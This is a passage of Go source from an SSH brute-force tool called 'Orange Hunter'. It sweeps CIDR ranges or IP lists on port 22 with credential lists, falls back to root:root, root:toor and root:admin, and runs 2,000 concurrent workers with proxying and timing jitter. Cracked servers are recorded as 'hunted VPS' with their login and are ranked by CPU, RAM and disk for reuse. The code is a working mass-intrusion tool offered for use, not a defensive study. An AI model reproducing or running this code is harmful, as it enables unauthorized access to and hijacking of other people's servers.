	specsStr := fmt.Sprintf("CPU:%d | RAM:%s | Disk:%s", vps.Specs.CPUCount, vps.Specs.RAM, vps.Specs.Disk)
	if len(specsStr) > 45 {
		specsStr = specsStr[:42] + "..."
	}

	fmt.Printf("\r%s[🎯] %s%-18s %s| %s%-12s %s| %s%-45s %s| %s%s%s\n",
		Green, Gold, vps.IP,
		DarkOrange, White, fmt.Sprintf("%s:%s", vps.Username, vps.Password),
		DarkOrange, White, specsStr,
		DarkOrange, ratingColor, Reset)
}

// ==================== PROGRESS DISPLAY ====================

func startProgressDisplay(done <-chan struct{}) {
	ticker := time.NewTicker(150 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-done:
			scanned := atomic.LoadInt64(&stats.ScannedIPs)
			total := atomic.LoadInt64(&stats.TotalIPs)
			hunted := atomic.LoadInt64(&stats.HuntedVPS)
			fmt.Printf("\r\033[K%s\n", drawProgressBar(scanned, total, hunted, scanSpeed))
			return
		case <-ticker.C:
			scanned := atomic.LoadInt64(&stats.ScannedIPs)
			total := atomic.LoadInt64(&stats.TotalIPs)
			hunted := atomic.LoadInt64(&stats.HuntedVPS)

			speedMutex.Lock()
			now := time.Now()
			elapsed := now.Sub(lastTime).Seconds()
			if elapsed > 0.5 {
				scanSpeed = float64(scanned-lastScanned) / elapsed
				lastScanned = scanned
				lastTime = now
			}
			speedMutex.Unlock()

			fmt.Printf("\r\033[K%s", drawProgressBar(scanned, total, hunted, scanSpeed))
		}
	}
}

// ==================== SIGNAL HANDLER ====================

func setupSignalHandler() {
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Printf("\n\n%s  ⚠️  Saving state...%s\n", Yellow, Reset)
		flushResumeFile()
		autoSaveResults()
		fmt.Printf("%s  ✅ State saved. Exiting.%s\n\n", Green, Reset)
		os.Exit(0)
	}()
}

// ==================== HUNT ENGINE ====================

func startHunt(cfg AppConfig) {
	clearScreen()
	printBanner()

	// Parse targets
	var ips []string
	switch cfg.TargetType {
	case "cidr":
		var err error
		ips, err = parseCIDR(cfg.CIDR)
		if err != nil {
			fmt.Printf("%s  ❌ CIDR Error: %v%s\n", Red, err, Reset)
			pressEnterToContinue()
			return
		}
		fmt.Printf("%s  🌐 CIDR: %s → %d IPs%s\n", FlameOrange, cfg.CIDR, len(ips), Reset)
	case "file":
		var err error
		ips, err = parseIPList(cfg.TargetFile)
		if err != nil {
			fmt.Printf("%s  ❌ File Error: %v%s\n", Red, err, Reset)
			pressEnterToContinue()
			return
		}
		fmt.Printf("%s  📄 File: %s → %d IPs%s\n", FlameOrange, cfg.TargetFile, len(ips), Reset)
	case "single":
		ips = []string{cfg.SingleIP}
		fmt.Printf("%s  📍 Single IP: %s%s\n", FlameOrange, cfg.SingleIP, Reset)
	default:
		fmt.Printf("%s  ❌ No targets configured! Go to Targets menu first.%s\n", Red, Reset)
		pressEnterToContinue()
		return
	}

	// Parse credentials
	creds, err := parseCredentials(cfg.UserFile, cfg.PassFile, cfg.ComboFile)
	if err != nil {
		fmt.Printf("%s  ❌ Credential Error: %v%s\n", Red, err, Reset)
		pressEnterToContinue()
		return
	}
	if len(creds) == 0 {
		creds = []Credential{
			{Username: "root", Password: "root"},
			{Username: "root", Password: "toor"},
			{Username: "root", Password: "admin"},
		}
		fmt.Printf("%s  ⚠️  Using default credentials%s\n", Yellow, Reset)
	}

	totalAttempts := int64(len(ips) * len(creds))
	stats.TotalIPs = totalAttempts
	stats.ScannedIPs = 0
	stats.HuntedVPS = 0
	stats.ErrorsCount = 0
	stats.StartTime = time.Now()
	lastTime = time.Now()
	lastScanned = 0
	scanSpeed = 0

	// Proxy setup
	if cfg.UseProxy && cfg.ProxyAddr != "" {
		var auth *proxy.Auth
		if cfg.ProxyUser != "" {
			auth = &proxy.Auth{User: cfg.ProxyUser, Password: cfg.ProxyPass}
		}
		dialer, err := proxy.SOCKS5("tcp", cfg.ProxyAddr, auth, proxy.Direct)
		if err != nil {
			fmt.Printf("%s  ❌ Proxy Error: %v%s\n", Red, err, Reset)
			pressEnterToContinue()
			return
		}
		proxyDialer = dialer
		useProxy = true
		fmt.Printf("%s  🔒 Proxy: %s%s\n", Green, cfg.ProxyAddr, Reset)
	} else {
		useProxy = false
		fmt.Printf("%s  ⚡ Direct mode%s\n", Yellow, Reset)
	}

	// Load resume
	loadResumeState()
	if len(resumeMap) > 0 {
		fmt.Printf("%s  📌 Resume: %d targets already done%s\n", Cyan, len(resumeMap), Reset)
	}

	fmt.Printf("\n%s  ╔══════════════════════════════════════════════════════╗%s\n", DarkOrange, Reset)
	fmt.Printf("%s  ║  %s🚀 LAUNCHING HUNT                                    %s║%s\n", DarkOrange, BrightGold, DarkOrange, Reset)
	fmt.Printf("%s  ║  IPs: %-6d | Creds: %-4d | Attempts: %-8d        %s║%s\n",
		DarkOrange, len(ips), len(creds), totalAttempts, DarkOrange, Reset)
	fmt.Printf("%s  ║  Workers: %-4d | Timeout: %-3ds | Jitter: %d-%dms    %s║%s\n",
		DarkOrange, cfg.Concurrency, cfg.Timeout, cfg.JitterMin, cfg.JitterMax, DarkOrange, Reset)
	fmt.Printf("%s  ╚══════════════════════════════════════════════════════╝%s\n\n", DarkOrange, Reset)

	fmt.Printf("%s  اضغط Enter لبدء الصيد...%s", Gold, Reset)
	reader.ReadString('\n')

	fmt.Printf("\n%s  🔥 HUNT STARTED! 🔥%s\n\n", FlameOrange, Reset)

	// Setup channels
	targetChan := make(chan Target, cfg.Concurrency*2)
	var wg sync.WaitGroup
	done := make(chan struct{})

	go startProgressDisplay(done)

	for i := 0; i < cfg.Concurrency; i++ {
		wg.Add(1)
		go hunterWorker(targetChan, creds[i%len(creds)], time.Duration(cfg.Timeout)*time.Second, &wg,
			time.Duration(cfg.JitterMin)*time.Millisecond, time.Duration(cfg.JitterMax)*time.Millisecond)
	}

	go func() {
		for _, ip := range ips {
			for range creds {
				targetChan <- Target{IP: ip, Port: cfg.Port}
			}
		}
		close(targetChan)
	}()

	wg.Wait()
	close(done)

	autoSaveResults()
	flushResumeFile()

	fmt.Printf("\n\n%s  ✅ HUNT COMPLETE!%s\n", Green, Reset)
	pressEnterToContinue()
}

func viewHuntedVPS() {
	printBanner()
	huntedMutex.Lock()
	results := make([]HuntedVPS, len(huntedVPSList))
	copy(results, huntedVPSList)
	huntedMutex.Unlock()

	if len(results) == 0 {
		fmt.Printf("\n\n%s  ╔════════════════════════════════════════╗%s\n", Red, Reset)
		fmt.Printf("%s  ║  😞 No VPS hunted yet.                ║%s\n", Red, Reset)
		fmt.Printf("%s  ╚════════════════════════════════════════╝%s\n", Red, Reset)
		pressEnterToContinue()
		return
	}

	godlike, high, medium, weak := 0, 0, 0, 0
	for _, vps := range results {
		switch vps.Rating {
		case "GODLIKE":
			godlike++
		case "HIGH":
			high++
		case "MEDIUM":
			medium++
		default:
			weak++
		}
	}

	fmt.Printf("\n\n")
	fmt.Printf("%s╔══════════════════════════════════════════════════════════════════════════╗%s\n", BrightGold, Reset)
	fmt.Printf("%s║ %s🏆 HUNTED VPS - POWER DISTRIBUTION                                    %s║%s\n", BrightGold, Gold, BrightGold, Reset)
	fmt.Printf("%s║ %s👑 GODLIKE: %-3d │ 🔥 HIGH: %-3d │ 📦 MEDIUM: %-3d │ 💤 WEAK: %-3d   %s║%s\n",
		BrightGold, White, godlike, high, medium, weak, BrightGold, Reset)
	fmt.Printf("%s╚══════════════════════════════════════════════════════════════════════════╝%s\n\n", BrightGold, Reset)

	fmt.Printf("%s╔══════════════════════════════════════════════════════════════════════════════════╗%s\n", DarkOrange, Reset)
	fmt.Printf("%s║ %-18s │ %-10s │ %-6s │ %-8s │ %-10s │ %-8s ║%s\n",
		DarkOrange, "IP", "Login", "CPU", "RAM", "Disk", "Rating", Reset)
	fmt.Printf("%s╠══════════════════════════════════════════════════════════════════════════════════╣%s\n", DarkOrange, Reset)

	displayCount := len(results)
	if displayCount > 20 {
		displayCount = 20
	}
	for i := 0; i < displayCount; i++ {
		vps := results[i]
		login := fmt.Sprintf("%s:%s", vps.Username, vps.Password)
		if len(login) > 10 {
			login = login[:7] + "..."
		}
		fmt.Printf("%s║ %s%-18s │ %-10s │ %-6d │ %-8s │ %-10s │ %-8s %s║%s\n",
			DarkOrange, White, vps.IP, login, vps.Specs.CPUCount, vps.Specs.RAM, vps.Specs.Disk, vps.Rating, DarkOrange, Reset)
	}
	fmt.Printf("%s╚══════════════════════════════════════════════════════════════════════════════════╝%s\n\n", DarkOrange, Reset)
	pressEnterToContinue()
}

// ==================== MAIN ====================

func main() {
	setupSignalHandler()

	cfg := AppConfig{
		TargetType:  "",
		Port:        22,
		Timeout:     5,
		Concurrency: 2000,
		UseProxy:    false,
		JitterMin:   50,
		JitterMax:   500,
	}

	loadResumeState()

	for {
		choice := mainMenu()
		switch choice {
		case 1:
			configMenu(&cfg)
		case 2:
			targetsMenu(&cfg)
		case 3:
			credentialsMenu(&cfg)
		case 4:
			proxyMenu(&cfg)
		case 5:
			performanceMenu(&cfg)
		case 6:
			viewConfig(&cfg)
		case 7:
			startHunt(cfg)
		case 8:
			viewHuntedVPS()
		case 0:
			clearScreen()
			printBanner()
			fmt.Printf("\n\n%s  🦁 Orange Hunter signing off... See you, Auditor!%s\n\n", FlameOrange, Reset)
			flushResumeFile()
			os.Exit(0)
		default:
			fmt.Printf("\n%s  ❌ Invalid choice!%s\n", Red, Reset)
			time.Sleep(800 * time.Millisecond)
		}
	}
}